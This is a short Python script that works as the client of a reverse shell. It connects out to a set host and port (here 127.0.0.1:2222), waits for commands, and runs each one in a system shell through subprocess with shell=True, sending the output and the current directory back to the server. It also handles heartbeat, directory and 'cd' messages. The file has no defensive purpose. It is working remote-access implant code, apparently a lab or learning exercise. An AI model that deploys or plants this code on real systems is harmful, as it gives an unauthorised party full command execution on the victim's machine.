import socket
import os
import subprocess

# Server Host IP Address
host = '127.0.0.1'

# Port for Connection
port = 2222

# Creating Socket
socket = socket.socket()

# Connecting to Server via Socket
socket.connect((host, port))

# Keep Connection Variable
keepConnection = True
# While Loop to Keep Listening for Commands
while keepConnection:

    # Receiving and Decoding Commands from Server
    serverData = str(socket.recv(6000), "utf-8")
    # Check if Server wants to close connection
    if serverData == 'close connection':
        keepConnection = False

    # Check if Server Sent a HeartBeat
    if serverData == 'heartbeat':

        # Sending Heartbeat to Server
        socket.send(str.encode("heartbeat"))

    # Getting Directory
    elif serverData == 'directory':

        # Sending Directory to Server
        socket.send(str.encode("\n" + os.getcwd() + ">"))

    # Checking if Command is a Change Directory Command
    elif serverData[:2] == "cd":

        try:
            # Changing Directory
            os.chdir(serverData[3:])
        except:
            pass

        # Sending Directory to Server
        socket.send(str.encode("\n" + os.getcwd() + ">"))

    # Filtering Connection Data
    elif serverData == '':
        pass

    # If Any Other Command
    else:

        # Executing Command
        cmd = subprocess.Popen(serverData, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                               stdin=subprocess.PIPE)

        # Saving Command (in string) to a Variable
        cmdBytes = str(cmd.stdout.read() + cmd.stderr.read(), 'utf-8')

        # Sending Results Back to Server
        socket.send(str.encode(cmdBytes + "\n" + os.getcwd() + ">"))
